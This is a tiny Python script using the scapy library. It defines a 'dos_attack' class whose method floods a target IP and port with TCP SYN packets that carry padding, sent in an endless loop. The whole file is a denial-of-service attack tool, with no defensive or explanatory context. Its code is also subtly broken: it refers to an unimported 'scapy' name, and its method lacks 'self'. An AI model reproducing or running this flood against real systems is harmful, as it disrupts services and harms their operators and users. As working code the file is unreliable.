from scapy.all import *

class dos_attack:
    def dos(ip, port):
        ip = scapy.IP(dst=ip)
        tcp = scapy.TCP(sport=RandShort(), dport=port, flags="S")
        raw = Raw(b"X"*1024)
        p = ip / tcp / raw
        send(p, loop=1, verbose=0)